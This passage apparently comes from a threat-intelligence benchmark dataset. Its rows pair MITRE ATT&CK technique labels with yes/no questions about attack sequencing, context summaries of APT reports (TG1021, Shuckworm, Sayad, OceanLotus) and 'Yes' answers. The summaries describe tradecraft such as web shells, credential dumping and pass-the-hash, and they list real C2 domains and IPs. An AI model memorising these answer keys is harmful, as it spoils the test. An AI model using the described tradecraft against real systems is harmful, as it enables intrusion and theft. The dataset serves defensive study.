Discovery: TG1021 used publicly available offensive security tools (OST) to perform reconnaissance, such as SharpHound to scan and map targets by loading it directly to infected machines' memory without writing the binary on the disk. Quickly after the execution, the threat actor retrieved the output files and deleted them. In addition, PowerSploit was loaded and executed using the same technique.
Lateral Movement: After establishing a foothold on an external IIS server, TG1021 accessed shared folders on internal web servers over SMB using compromised domain credentials. On several occasions, the threat actor dropped the NodeIISWeb web shell loader via SMB to compromise additional servers. Additionally, the threat actor utilized the exploits mentioned above to move laterally between IIS servers.
Command and Control: TG1021 established command and control by deploying an inline hook on a validation function within the IIS request handling process. The malware, NodeIISWeb, provided backdoor functionality, allowing the threat actor to perform various actions on the affected host, including file and directory manipulation, system information gathering, dynamic DLL loading and execution, and code injection.",Yes,TG1021 - Praying Mantis Threat Actor
1746,32,32-Lateral Movement-T1021-Remote Services,"After TG1021 used SharpHound and PowerSploit loaded directly to infected machines' memory to perform reconnaissance and gathered output files during the Discovery phase, is it likely that TG1021 would access shared folders on internal web servers over SMB and drop the NodeIISWeb web shell loader to compromise additional servers during the Lateral Movement phase?","Lateral Movement: After establishing a foothold on an external IIS server, TG1021 accessed shared folders on internal web servers over SMB using compromised domain credentials. On several occasions, the threat actor dropped the NodeIISWeb web shell loader via SMB to compromise additional servers. Additionally, the threat actor utilized the exploits mentioned above to move laterally between IIS servers.","Reconnaissance: The Sygnia Incident Response team identified that TG1021, also known as \
Initial Access: TG1021 gained initial access to target networks by exploiting internet-facing Windows IIS servers using deserialization attacks. The threat actor leveraged a variety of exploits, including a 0-day vulnerability associated with the \
Execution: TG1021 executed a sophisticated memory-resident malware, referred to as \
Persistence: To maintain persistence, TG1021 utilized web shells and a custom malware framework that operates almost entirely in-memory. The core component of this framework, the NodeIISWeb malware, intercepts and handles HTTP requests received by the server. Additionally, the threat actor actively removed all disk-resident tools after using them, effectively giving up on persistency in exchange for stealth.
Privilege Escalation: TG1021 employed various techniques for privilege escalation, including the use of a custom version of the Potato family tools, known as PotatoEx.dll, which is a common local privilege escalation tool. The threat actor also used dynamic DLL loading and execution, as well as code injection and token manipulation functionalities provided by the second stage malware, ExtDLL.dll.
Defense Evasion: TG1021 demonstrated significant efforts to avoid detection by actively interfering with logging mechanisms and successfully evading commercial EDRs. The malware used by TG1021 shows a significant effort to avoid detection, both by actively interfering with logging mechanisms, successfully evading commercial EDRs, and by silently awaiting incoming connections, rather than connecting back to a C2 channel and continuously generating traffic. Furthermore, the threat actor actively removed all disk-resident tools after using them, effectively giving up on persistency in exchange for stealth.
Credential Access: TG1021 modified login webpages to record credentials and save them to a file in clear text format. The modification is a short-embedded code-block at the beginning of the webpage file with a simple try-catch phrase code.
Discovery: TG1021 used publicly available offensive security tools (OST) to perform reconnaissance, such as SharpHound to scan and map targets by loading it directly to infected machines' memory without writing the binary on the disk. Quickly after the execution, the threat actor retrieved the output files and deleted them. In addition, PowerSploit was loaded and executed using the same technique.
Command and Control: TG1021 established command and control by deploying an inline hook on a validation function within the IIS request handling process. The malware, NodeIISWeb, provided backdoor functionality, allowing the threat actor to perform various actions on the affected host, including file and directory manipulation, system information gathering, dynamic DLL loading and execution, and code injection.",Yes,TG1021 - Praying Mantis Threat Actor
1750,32,32-Command and Control-T1219-Remote Access Software,"After TG1021 accessed shared folders on internal web servers over SMB using compromised domain credentials and dropped the NodeIISWeb web shell loader via SMB for lateral movement, is it likely that they established command and control by deploying an inline hook on a validation function within the IIS request handling process, allowing NodeIISWeb to provide backdoor functionality?","Command and Control: TG1021 established command and control by deploying an inline hook on a validation function within the IIS request handling process. The malware, NodeIISWeb, provided backdoor functionality, allowing the threat actor to perform various actions on the affected host, including file and directory manipulation, system information gathering, dynamic DLL loading and execution, and code injection.","Reconnaissance: The Sygnia Incident Response team identified that TG1021, also known as \
Initial Access: TG1021 gained initial access to target networks by exploiting internet-facing Windows IIS servers using deserialization attacks. The threat actor leveraged a variety of exploits, including a 0-day vulnerability associated with the \
Execution: TG1021 executed a sophisticated memory-resident malware, referred to as \
Persistence: To maintain persistence, TG1021 utilized web shells and a custom malware framework that operates almost entirely in-memory. The core component of this framework, the NodeIISWeb malware, intercepts and handles HTTP requests received by the server. Additionally, the threat actor actively removed all disk-resident tools after using them, effectively giving up on persistency in exchange for stealth.
Privilege Escalation: TG1021 employed various techniques for privilege escalation, including the use of a custom version of the Potato family tools, known as PotatoEx.dll, which is a common local privilege escalation tool. The threat actor also used dynamic DLL loading and execution, as well as code injection and token manipulation functionalities provided by the second stage malware, ExtDLL.dll.
Defense Evasion: TG1021 demonstrated significant efforts to avoid detection by actively interfering with logging mechanisms and successfully evading commercial EDRs. The malware used by TG1021 shows a significant effort to avoid detection, both by actively interfering with logging mechanisms, successfully evading commercial EDRs, and by silently awaiting incoming connections, rather than connecting back to a C2 channel and continuously generating traffic. Furthermore, the threat actor actively removed all disk-resident tools after using them, effectively giving up on persistency in exchange for stealth.
Credential Access: TG1021 modified login webpages to record credentials and save them to a file in clear text format. The modification is a short-embedded code-block at the beginning of the webpage file with a simple try-catch phrase code.
Discovery: TG1021 used publicly available offensive security tools (OST) to perform reconnaissance, such as SharpHound to scan and map targets by loading it directly to infected machines' memory without writing the binary on the disk. Quickly after the execution, the threat actor retrieved the output files and deleted them. In addition, PowerSploit was loaded and executed using the same technique.
Lateral Movement: After establishing a foothold on an external IIS server, TG1021 accessed shared folders on internal web servers over SMB using compromised domain credentials. On several occasions, the threat actor dropped the NodeIISWeb web shell loader via SMB to compromise additional servers. Additionally, the threat actor utilized the exploits mentioned above to move laterally between IIS servers.",Yes,TG1021 - Praying Mantis Threat Actor
1751,320,320-Initial Access-T1566-Phishing,"After Shuckworm established command and control via HTTP requests to their servers, is it likely that they initiated the attack chain by delivering a malicious document through phishing emails before executing VBS scripts and creating scheduled tasks for persistence?","Initial Access: The attack chain initiated by Shuckworm against a Ukrainian organization began on July 14, 2021, with the opening of a malicious document, likely delivered via phishing email. The document contained a custom backdoor known as Pterodo, which was executed using a suspicious command.","Execution: Following the initial compromise, Shuckworm executed various VBS scripts and HTA files to maintain their presence and execute their backdoor. They also created scheduled tasks to ensure persistence and executed commands via scripts. On July 16, additional variants of Pterodo were executed, and on July 28, a VNC client was installed as the ultimate payload for the attack.
Persistence: Shuckworm established persistence by creating scheduled tasks that executed malicious VBS files every few minutes. These tasks ensured that their backdoor would remain active even after system reboots.
Defense Evasion: Shuckworm utilized mshta.exe to bypass application control solutions and browser security settings. They also used scheduled tasks and VBS scripts to evade detection and maintain their foothold.
Collection: Between July 29 and August 18, Shuckworm deployed multiple variants of their custom VBS backdoor and executed VBS scripts. It is unclear if the documents accessed during this period were part of the attackers' efforts to collect and exfiltrate sensitive information.
Command and Control: Shuckworm established command and control by communicating with their servers using HTTP requests and downloading additional payloads. They used various C&C servers, including deep-pitched.enarto.ru, arianat.ru, and mucoris.ru, to control the compromised systems and download tools.
Others: Symantec's Threat Hunter Team, part of Broadcom Software, has been tracking Shuckworm's cyber-espionage activities against Ukraine. Shuckworm, also known as Gamaredon or Armageddon, has been active since at least 2013 and has recently increased the sophistication of their attacks. The Security Service of Ukraine (SSU) reported that Shuckworm has been using living-off-the-land tools to steal credentials and move laterally on victim networks. Symantec's investigation revealed seven files used by Shuckworm in their attacks, all of which are 7-zip SFX self-extracting binaries. These files included various VBS files, a VNC client, and a Process Explorer binary. The IOCs from the investigation showed patterns such as C&C IPs belonging to a short list of hosting providers and suspected malicious files found in specific directories with names starting with the letter 'd'. The SSU report from November 2021 attributed over 5,000 attacks to Shuckworm since 2014, targeting more than 1,500 Ukrainian government systems.",Yes,Shuckworm_APT
1754,320,320-Defense Evasion-T1218-System Binary Proxy Execution,"After executing malicious VBS scripts to maintain their presence and deploying their custom backdoor, is Shuckworm likely to use mshta.exe to bypass application control solutions before employing their HTTP-based C&C servers for communication and tool downloading?",Defense Evasion: Shuckworm utilized mshta.exe to bypass application control solutions and browser security settings. They also used scheduled tasks and VBS scripts to evade detection and maintain their foothold.,"Initial Access: The attack chain initiated by Shuckworm against a Ukrainian organization began on July 14, 2021, with the opening of a malicious document, likely delivered via phishing email. The document contained a custom backdoor known as Pterodo, which was executed using a suspicious command.
Execution: Following the initial compromise, Shuckworm executed various VBS scripts and HTA files to maintain their presence and execute their backdoor. They also created scheduled tasks to ensure persistence and executed commands via scripts. On July 16, additional variants of Pterodo were executed, and on July 28, a VNC client was installed as the ultimate payload for the attack.
Persistence: Shuckworm established persistence by creating scheduled tasks that executed malicious VBS files every few minutes. These tasks ensured that their backdoor would remain active even after system reboots.
Collection: Between July 29 and August 18, Shuckworm deployed multiple variants of their custom VBS backdoor and executed VBS scripts. It is unclear if the documents accessed during this period were part of the attackers' efforts to collect and exfiltrate sensitive information.
Command and Control: Shuckworm established command and control by communicating with their servers using HTTP requests and downloading additional payloads. They used various C&C servers, including deep-pitched.enarto.ru, arianat.ru, and mucoris.ru, to control the compromised systems and download tools.
Others: Symantec's Threat Hunter Team, part of Broadcom Software, has been tracking Shuckworm's cyber-espionage activities against Ukraine. Shuckworm, also known as Gamaredon or Armageddon, has been active since at least 2013 and has recently increased the sophistication of their attacks. The Security Service of Ukraine (SSU) reported that Shuckworm has been using living-off-the-land tools to steal credentials and move laterally on victim networks. Symantec's investigation revealed seven files used by Shuckworm in their attacks, all of which are 7-zip SFX self-extracting binaries. These files included various VBS files, a VNC client, and a Process Explorer binary. The IOCs from the investigation showed patterns such as C&C IPs belonging to a short list of hosting providers and suspected malicious files found in specific directories with names starting with the letter 'd'. The SSU report from November 2021 attributed over 5,000 attacks to Shuckworm since 2014, targeting more than 1,500 Ukrainian government systems.",Yes,Shuckworm_APT
1763,321,321-Defense Evasion-T1027-Obfuscated Files or Information,"After ensuring persistence by modifying the registry to run DiagnosticsService.dll at startup using rundll32.exe, is it likely that Sayad will use oversimplified obfuscation techniques like Base64 encoding or export a managed API through the native Export Address Table for defense evasion before stealing credentials from applications like FileZilla, WinSCP, and Putty?","Defense Evasion: Sayad uses an oversimplified form of obfuscation for strings utilizing Base64 encoding, which can be easily de-obfuscated. It also uses non-traditional methods for native to .NET interop, like exporting a managed API through the native Export Address Table, to evade detection.","Reconnaissance: The Sayad malware, also known as Flying Kitten, is distributed through phishing emails, indicating a form of reconnaissance where the attackers gather email addresses and possibly other information to target specific individuals or organizations.
Resource Development: The Sayad malware is a self-contained executable that embeds all required malicious components, meaning it does not need to download additional content from a C2 server, which could be suspicious. This suggests that the attackers have developed and staged their capabilities in advance.
Initial Access: Sayad malware gains initial access through phishing emails, which trick users into downloading and executing the malicious executable.
Execution: The Sayad malware executes by first running a self-extracting executable (WEXTRACT.exe) that drops and launches the Binder executable malware. The Binder then checks the .NET version installed on the machine and drops the information stealer DLL component, Sayad (aka Client)  - DiagnosticsService.dll.
Persistence: The Sayad malware ensures persistence by modifying the registry to run at startup using rundll32.exe, which loads the Client (DiagnosticsService.dll).
Credential Access: Sayad is designed to steal sensitive information, including credentials for FTP clients (FileZilla and WinSCP), VPN client user configuration files, and RDP and Putty accounts.
Discovery: Sayad collects a wide range of information from the compromised host, including system information, running processes, open ports, and registered proxies. It also gathers data from browsers, messengers, and other applications to discover the environment it has compromised.
Collection: Sayad collects various types of data, including keystrokes, clipboard contents, browser bookmarks and cookies, chat history, and VPN-related account information. It also captures screenshots and collects data from removable media.
Command and Control: The Sayad malware communicates with a C2 server located at the IP address 107.6.182.179 to upload collected data. The data is encrypted using an RSA public key before being uploaded.
Exfiltration: The Sayad malware uploads the collected and encrypted data to a malicious web server using the URL hxxp://0o0o0o0o0.com/soft.php.
Others: The Sayad malware is linked to the Iranian hacking group Ajax Security Team. The detection rate for the Sayad malware binary at VirusTotal is zero, indicating that it may not be widely recognized by antivirus solutions. The malware uses a .NET OOP/OOD background and is unique in its implementation. The malicious server is located in the Netherlands, and the domain was registered with email addresses associated with microsofts.com, which raises questions about the legitimacy of the registration.",Yes,Sayad_Flying_Kitten_analysis
1765,321,321-Discovery-T1082-System Information Discovery,"After Sayad gains persistence by modifying the registry to run at startup using rundll32.exe, is it likely that Sayad will collect system information from the compromised host before proceeding to gather data from browsers, messengers, and other applications to discover the compromised environment?","Discovery: Sayad collects a wide range of information from the compromised host, including system information, running processes, open ports, and registered proxies. It also gathers data from browsers, messengers, and other applications to discover the environment it has compromised.","Reconnaissance: The Sayad malware, also known as Flying Kitten, is distributed through phishing emails, indicating a form of reconnaissance where the attackers gather email addresses and possibly other information to target specific individuals or organizations.
Resource Development: The Sayad malware is a self-contained executable that embeds all required malicious components, meaning it does not need to download additional content from a C2 server, which could be suspicious. This suggests that the attackers have developed and staged their capabilities in advance.
Initial Access: Sayad malware gains initial access through phishing emails, which trick users into downloading and executing the malicious executable.
Execution: The Sayad malware executes by first running a self-extracting executable (WEXTRACT.exe) that drops and launches the Binder executable malware. The Binder then checks the .NET version installed on the machine and drops the information stealer DLL component, Sayad (aka Client)  - DiagnosticsService.dll.
Persistence: The Sayad malware ensures persistence by modifying the registry to run at startup using rundll32.exe, which loads the Client (DiagnosticsService.dll).
Defense Evasion: Sayad uses an oversimplified form of obfuscation for strings utilizing Base64 encoding, which can be easily de-obfuscated. It also uses non-traditional methods for native to .NET interop, like exporting a managed API through the native Export Address Table, to evade detection.
Credential Access: Sayad is designed to steal sensitive information, including credentials for FTP clients (FileZilla and WinSCP), VPN client user configuration files, and RDP and Putty accounts.
Collection: Sayad collects various types of data, including keystrokes, clipboard contents, browser bookmarks and cookies, chat history, and VPN-related account information. It also captures screenshots and collects data from removable media.
Command and Control: The Sayad malware communicates with a C2 server located at the IP address 107.6.182.179 to upload collected data. The data is encrypted using an RSA public key before being uploaded.
Exfiltration: The Sayad malware uploads the collected and encrypted data to a malicious web server using the URL hxxp://0o0o0o0o0.com/soft.php.
Others: The Sayad malware is linked to the Iranian hacking group Ajax Security Team. The detection rate for the Sayad malware binary at VirusTotal is zero, indicating that it may not be widely recognized by antivirus solutions. The malware uses a .NET OOP/OOD background and is unique in its implementation. The malicious server is located in the Netherlands, and the domain was registered with email addresses associated with microsofts.com, which raises questions about the legitimacy of the registration.",Yes,Sayad_Flying_Kitten_analysis
1766,321,321-Discovery-T1057-Process Discovery,"After Sayad malware performs discovery activities such as collecting running processes, is it likely to collect keystrokes, clipboard contents, browser bookmarks and cookies, and other sensitive data for exfiltration before communicating with its C2 server at 107.6.182.179?","Discovery: Sayad collects a wide range of information from the compromised host, including system information, running processes, open ports, and registered proxies. It also gathers data from browsers, messengers, and other applications to discover the environment it has compromised.","Reconnaissance: The Sayad malware, also known as Flying Kitten, is distributed through phishing emails, indicating a form of reconnaissance where the attackers gather email addresses and possibly other information to target specific individuals or organizations.
Resource Development: The Sayad malware is a self-contained executable that embeds all required malicious components, meaning it does not need to download additional content from a C2 server, which could be suspicious. This suggests that the attackers have developed and staged their capabilities in advance.
Initial Access: Sayad malware gains initial access through phishing emails, which trick users into downloading and executing the malicious executable.
Execution: The Sayad malware executes by first running a self-extracting executable (WEXTRACT.exe) that drops and launches the Binder executable malware. The Binder then checks the .NET version installed on the machine and drops the information stealer DLL component, Sayad (aka Client)  - DiagnosticsService.dll.
Persistence: The Sayad malware ensures persistence by modifying the registry to run at startup using rundll32.exe, which loads the Client (DiagnosticsService.dll).
Defense Evasion: Sayad uses an oversimplified form of obfuscation for strings utilizing Base64 encoding, which can be easily de-obfuscated. It also uses non-traditional methods for native to .NET interop, like exporting a managed API through the native Export Address Table, to evade detection.
Credential Access: Sayad is designed to steal sensitive information, including credentials for FTP clients (FileZilla and WinSCP), VPN client user configuration files, and RDP and Putty accounts.
Collection: Sayad collects various types of data, including keystrokes, clipboard contents, browser bookmarks and cookies, chat history, and VPN-related account information. It also captures screenshots and collects data from removable media.
Command and Control: The Sayad malware communicates with a C2 server located at the IP address 107.6.182.179 to upload collected data. The data is encrypted using an RSA public key before being uploaded.
Exfiltration: The Sayad malware uploads the collected and encrypted data to a malicious web server using the URL hxxp://0o0o0o0o0.com/soft.php.
Others: The Sayad malware is linked to the Iranian hacking group Ajax Security Team. The detection rate for the Sayad malware binary at VirusTotal is zero, indicating that it may not be widely recognized by antivirus solutions. The malware uses a .NET OOP/OOD background and is unique in its implementation. The malicious server is located in the Netherlands, and the domain was registered with email addresses associated with microsofts.com, which raises questions about the legitimacy of the registration.",Yes,Sayad_Flying_Kitten_analysis
1769,321,321-Discovery-T1217-Browser Information Discovery,"After Sayad ensures persistence by modifying the registry to run at startup using rundll32.exe to load its DLL component, is it likely that the malware will collect data from browsers as part of its discovery activities before communicating with a C2 server to upload the gathered data?","Discovery: Sayad collects a wide range of information from the compromised host, including system information, running processes, open ports, and registered proxies. It also gathers data from browsers, messengers, and other applications to discover the environment it has compromised.","Reconnaissance: The Sayad malware, also known as Flying Kitten, is distributed through phishing emails, indicating a form of reconnaissance where the attackers gather email addresses and possibly other information to target specific individuals or organizations.
Resource Development: The Sayad malware is a self-contained executable that embeds all required malicious components, meaning it does not need to download additional content from a C2 server, which could be suspicious. This suggests that the attackers have developed and staged their capabilities in advance.
Initial Access: Sayad malware gains initial access through phishing emails, which trick users into downloading and executing the malicious executable.
Execution: The Sayad malware executes by first running a self-extracting executable (WEXTRACT.exe) that drops and launches the Binder executable malware. The Binder then checks the .NET version installed on the machine and drops the information stealer DLL component, Sayad (aka Client)  - DiagnosticsService.dll.
Persistence: The Sayad malware ensures persistence by modifying the registry to run at startup using rundll32.exe, which loads the Client (DiagnosticsService.dll).
Defense Evasion: Sayad uses an oversimplified form of obfuscation for strings utilizing Base64 encoding, which can be easily de-obfuscated. It also uses non-traditional methods for native to .NET interop, like exporting a managed API through the native Export Address Table, to evade detection.
Credential Access: Sayad is designed to steal sensitive information, including credentials for FTP clients (FileZilla and WinSCP), VPN client user configuration files, and RDP and Putty accounts.
Collection: Sayad collects various types of data, including keystrokes, clipboard contents, browser bookmarks and cookies, chat history, and VPN-related account information. It also captures screenshots and collects data from removable media.
Command and Control: The Sayad malware communicates with a C2 server located at the IP address 107.6.182.179 to upload collected data. The data is encrypted using an RSA public key before being uploaded.
Exfiltration: The Sayad malware uploads the collected and encrypted data to a malicious web server using the URL hxxp://0o0o0o0o0.com/soft.php.
Others: The Sayad malware is linked to the Iranian hacking group Ajax Security Team. The detection rate for the Sayad malware binary at VirusTotal is zero, indicating that it may not be widely recognized by antivirus solutions. The malware uses a .NET OOP/OOD background and is unique in its implementation. The malicious server is located in the Netherlands, and the domain was registered with email addresses associated with microsofts.com, which raises questions about the legitimacy of the registration.",Yes,Sayad_Flying_Kitten_analysis
1775,321,321-Collection-T1119-Automated Collection,"After gathering information about the compromised host, such as system details, running processes, and data from applications during the Discovery phase, is the Sayad malware likely to collect browser bookmarks, cookies, and chat history during the Collection phase, before encrypting and uploading the data to a C2 server at 107.6.182.179 using RSA encryption?","Collection: Sayad collects various types of data, including keystrokes, clipboard contents, browser bookmarks and cookies, chat history, and VPN-related account information. It also captures screenshots and collects data from removable media.","Reconnaissance: The Sayad malware, also known as Flying Kitten, is distributed through phishing emails, indicating a form of reconnaissance where the attackers gather email addresses and possibly other information to target specific individuals or organizations.
Resource Development: The Sayad malware is a self-contained executable that embeds all required malicious components, meaning it does not need to download additional content from a C2 server, which could be suspicious. This suggests that the attackers have developed and staged their capabilities in advance.
Initial Access: Sayad malware gains initial access through phishing emails, which trick users into downloading and executing the malicious executable.
Execution: The Sayad malware executes by first running a self-extracting executable (WEXTRACT.exe) that drops and launches the Binder executable malware. The Binder then checks the .NET version installed on the machine and drops the information stealer DLL component, Sayad (aka Client)  - DiagnosticsService.dll.
Persistence: The Sayad malware ensures persistence by modifying the registry to run at startup using rundll32.exe, which loads the Client (DiagnosticsService.dll).
Defense Evasion: Sayad uses an oversimplified form of obfuscation for strings utilizing Base64 encoding, which can be easily de-obfuscated. It also uses non-traditional methods for native to .NET interop, like exporting a managed API through the native Export Address Table, to evade detection.
Credential Access: Sayad is designed to steal sensitive information, including credentials for FTP clients (FileZilla and WinSCP), VPN client user configuration files, and RDP and Putty accounts.
Discovery: Sayad collects a wide range of information from the compromised host, including system information, running processes, open ports, and registered proxies. It also gathers data from browsers, messengers, and other applications to discover the environment it has compromised.
Command and Control: The Sayad malware communicates with a C2 server located at the IP address 107.6.182.179 to upload collected data. The data is encrypted using an RSA public key before being uploaded.
Exfiltration: The Sayad malware uploads the collected and encrypted data to a malicious web server using the URL hxxp://0o0o0o0o0.com/soft.php.
Others: The Sayad malware is linked to the Iranian hacking group Ajax Security Team. The detection rate for the Sayad malware binary at VirusTotal is zero, indicating that it may not be widely recognized by antivirus solutions. The malware uses a .NET OOP/OOD background and is unique in its implementation. The malicious server is located in the Netherlands, and the domain was registered with email addresses associated with microsofts.com, which raises questions about the legitimacy of the registration.",Yes,Sayad_Flying_Kitten_analysis
1777,321,321-Collection-T1113-Screen Capture,"After Sayad malware performs discovery by collecting system and application details from the compromised host, is it likely to proceed with capturing screenshots as part of its data collection efforts before exfiltrating the collected and encrypted data to a malicious web server?","Collection: Sayad collects various types of data, including keystrokes, clipboard contents, browser bookmarks and cookies, chat history, and VPN-related account information. It also captures screenshots and collects data from removable media.","Reconnaissance: The Sayad malware, also known as Flying Kitten, is distributed through phishing emails, indicating a form of reconnaissance where the attackers gather email addresses and possibly other information to target specific individuals or organizations.
Resource Development: The Sayad malware is a self-contained executable that embeds all required malicious components, meaning it does not need to download additional content from a C2 server, which could be suspicious. This suggests that the attackers have developed and staged their capabilities in advance.
Initial Access: Sayad malware gains initial access through phishing emails, which trick users into downloading and executing the malicious executable.
Execution: The Sayad malware executes by first running a self-extracting executable (WEXTRACT.exe) that drops and launches the Binder executable malware. The Binder then checks the .NET version installed on the machine and drops the information stealer DLL component, Sayad (aka Client)  - DiagnosticsService.dll.
Persistence: The Sayad malware ensures persistence by modifying the registry to run at startup using rundll32.exe, which loads the Client (DiagnosticsService.dll).
Defense Evasion: Sayad uses an oversimplified form of obfuscation for strings utilizing Base64 encoding, which can be easily de-obfuscated. It also uses non-traditional methods for native to .NET interop, like exporting a managed API through the native Export Address Table, to evade detection.
Credential Access: Sayad is designed to steal sensitive information, including credentials for FTP clients (FileZilla and WinSCP), VPN client user configuration files, and RDP and Putty accounts.
Discovery: Sayad collects a wide range of information from the compromised host, including system information, running processes, open ports, and registered proxies. It also gathers data from browsers, messengers, and other applications to discover the environment it has compromised.
Command and Control: The Sayad malware communicates with a C2 server located at the IP address 107.6.182.179 to upload collected data. The data is encrypted using an RSA public key before being uploaded.
Exfiltration: The Sayad malware uploads the collected and encrypted data to a malicious web server using the URL hxxp://0o0o0o0o0.com/soft.php.
Others: The Sayad malware is linked to the Iranian hacking group Ajax Security Team. The detection rate for the Sayad malware binary at VirusTotal is zero, indicating that it may not be widely recognized by antivirus solutions. The malware uses a .NET OOP/OOD background and is unique in its implementation. The malicious server is located in the Netherlands, and the domain was registered with email addresses associated with microsofts.com, which raises questions about the legitimacy of the registration.",Yes,Sayad_Flying_Kitten_analysis
1778,321,321-Collection-T1025-Data from Removable Media,"After gathering system information, open ports, and browser data during the discovery phase, is it likely that the Sayad malware will collect keystrokes, clipboard contents, screenshots, and data from removable media before uploading the encrypted data to a malicious web server during the exfiltration phase?","Collection: Sayad collects various types of data, including keystrokes, clipboard contents, browser bookmarks and cookies, chat history, and VPN-related account information. It also captures screenshots and collects data from removable media.","Reconnaissance: The Sayad malware, also known as Flying Kitten, is distributed through phishing emails, indicating a form of reconnaissance where the attackers gather email addresses and possibly other information to target specific individuals or organizations.
Resource Development: The Sayad malware is a self-contained executable that embeds all required malicious components, meaning it does not need to download additional content from a C2 server, which could be suspicious. This suggests that the attackers have developed and staged their capabilities in advance.
Initial Access: Sayad malware gains initial access through phishing emails, which trick users into downloading and executing the malicious executable.
Execution: The Sayad malware executes by first running a self-extracting executable (WEXTRACT.exe) that drops and launches the Binder executable malware. The Binder then checks the .NET version installed on the machine and drops the information stealer DLL component, Sayad (aka Client)  - DiagnosticsService.dll.
Persistence: The Sayad malware ensures persistence by modifying the registry to run at startup using rundll32.exe, which loads the Client (DiagnosticsService.dll).
Defense Evasion: Sayad uses an oversimplified form of obfuscation for strings utilizing Base64 encoding, which can be easily de-obfuscated. It also uses non-traditional methods for native to .NET interop, like exporting a managed API through the native Export Address Table, to evade detection.
Credential Access: Sayad is designed to steal sensitive information, including credentials for FTP clients (FileZilla and WinSCP), VPN client user configuration files, and RDP and Putty accounts.
Discovery: Sayad collects a wide range of information from the compromised host, including system information, running processes, open ports, and registered proxies. It also gathers data from browsers, messengers, and other applications to discover the environment it has compromised.
Command and Control: The Sayad malware communicates with a C2 server located at the IP address 107.6.182.179 to upload collected data. The data is encrypted using an RSA public key before being uploaded.
Exfiltration: The Sayad malware uploads the collected and encrypted data to a malicious web server using the URL hxxp://0o0o0o0o0.com/soft.php.
Others: The Sayad malware is linked to the Iranian hacking group Ajax Security Team. The detection rate for the Sayad malware binary at VirusTotal is zero, indicating that it may not be widely recognized by antivirus solutions. The malware uses a .NET OOP/OOD background and is unique in its implementation. The malicious server is located in the Netherlands, and the domain was registered with email addresses associated with microsofts.com, which raises questions about the legitimacy of the registration.",Yes,Sayad_Flying_Kitten_analysis
1787,322,322-Command and Control-T1071-Application Layer Protocol,Is it likely that the OceanLotus Group will perform lateral movement using stolen credentials and leveraging Windows built-in tools before establishing command-and-control communication through HTTP and DNS Tunneling?,"Command and Control: The OceanLotus Group used HTTP and DNS Tunneling for command-and-control communication, and a novel backdoor that utilized Microsoft Outlook for command execution and data exfiltration.","Reconnaissance: The OceanLotus Group, also known as APT-C-00, SeaLotus, and APT32, initiated Operation Cobalt Kitty by targeting a global corporation based in Asia. They focused on the company's top-level management, including vice presidents, senior directors, and key personnel in operational departments. The attackers used spear-phishing attacks to gather information and compromise over 40 PCs and servers, including critical infrastructure such as the domain controller, file servers, web application server, and database server.
Resource Development: The OceanLotus Group developed a sophisticated arsenal for Operation Cobalt Kitty, which included modified publicly-available tools and six undocumented custom-built tools. These tools were designed to evade traditional security products and included two backdoors exploiting DLL sideloading in applications from Microsoft, Google, and Kaspersky, as well as a novel backdoor targeting Microsoft Outlook for command-and-control and data exfiltration.
Initial Access: The initial penetration vector for Operation Cobalt Kitty was social engineering through spear-phishing emails containing links to malicious sites or weaponized Word documents with malicious macros. These macros created persistence on the compromised machines using two scheduled tasks designed to download secondary payloads, mainly Cobalt Strike Beacon.
Execution: During the first phase of Operation Cobalt Kitty, the OceanLotus Group operated a fileless PowerShell-based infrastructure using customized payloads from offensive frameworks like Cobalt Strike, PowerSploit, and Nishang. The attackers executed PowerShell scripts with embedded base64-encoded payloads to load additional scripts or fetch payloads from the command-and-control server.
Persistence: The OceanLotus Group established persistence on the network by using Windows registry, services, and scheduled tasks. They executed loader scripts at startup or at predetermined intervals, ensuring the continuous operation of their fileless in-memory payload delivery infrastructure.
Privilege Escalation: The OceanLotus Group used the Mimikatz credential dumping tool to obtain credentials, including user passwords, NTLM hashes, and Kerberos tickets. They customized and obfuscated over 10 different Mimikatz payloads to evade antivirus detection and used the stolen credentials to perform lateral movement and infect more machines.
Defense Evasion: To maintain stealth and avoid detection, the OceanLotus Group exploited DLL hijacking vulnerabilities in trusted applications, bypassing application whitelisting and security software. They also implemented DNS Tunneling as a command-and-control communication method to overcome network filtering solutions, configuring the backdoor to communicate with Google and OpenDNS servers.
Credential Access: The OceanLotus Group harvested credentials stored on compromised machines using the Mimikatz tool. They customized and obfuscated Mimikatz payloads to evade detection and used the stolen credentials to infect additional machines and leverage Windows built-in tools for lateral movement.
Discovery: The OceanLotus Group performed lateral movement and infected new machines during the third phase of Operation Cobalt Kitty. They harvested credentials from compromised machines to facilitate this process.
Lateral Movement: Using stolen credentials, the OceanLotus Group expanded their control within the network by infecting new machines and leveraging Windows built-in tools, pass-the-ticket, and pass-the-hash attacks.
Exfiltration: The OceanLotus Group exfiltrated data using a backdoor macro installed in Microsoft Outlook, which enabled them to execute commands, deploy tools, and steal valuable data from compromised machines.
Others: Operation Cobalt Kitty was a major cyber espionage APT carried out by the OceanLotus Group against a global corporation in Asia. The attackers continuously adapted their techniques and upgraded their arsenal to remain undetected. Cybereason was able to monitor and detect the entire attack lifecycle, from infiltration to exfiltration. The attackers' tools were not detected by traditional antivirus software, highlighting the sophistication of their methods and the importance of understanding behavioral patterns to combat APTs.",Yes,operation-cobalt-kitty
1793,322,322-Lateral Movement-T1550-Use Alternate Authentication Material,"After harvesting credentials using the Mimikatz tool and performing credential dumping on compromised machines, is it likely that the OceanLotus Group will expand their control within the network by using stolen credentials, pass-the-ticket, and pass-the-hash techniques before executing data exfiltration through a backdoor macro in Microsoft Outlook?","Lateral Movement: Using stolen credentials, the OceanLotus Group expanded their control within the network by infecting new machines and leveraging Windows built-in tools, pass-the-ticket, and pass-the-hash attacks.","Reconnaissance: The OceanLotus Group, also known as APT-C-00, SeaLotus, and APT32, initiated Operation Cobalt Kitty by targeting a global corporation based in Asia. They focused on the company's top-level management, including vice presidents, senior directors, and key personnel in operational departments. The attackers used spear-phishing attacks to gather information and compromise over 40 PCs and servers, including critical infrastructure such as the domain controller, file servers, web application server, and database server.
Resource Development: The OceanLotus Group developed a sophisticated arsenal for Operation Cobalt Kitty, which included modified publicly-available tools and six undocumented custom-built tools. These tools were designed to evade traditional security products and included two backdoors exploiting DLL sideloading in applications from Microsoft, Google, and Kaspersky, as well as a novel backdoor targeting Microsoft Outlook for command-and-control and data exfiltration.
Initial Access: The initial penetration vector for Operation Cobalt Kitty was social engineering through spear-phishing emails containing links to malicious sites or weaponized Word documents with malicious macros. These macros created persistence on the compromised machines using two scheduled tasks designed to download secondary payloads, mainly Cobalt Strike Beacon.
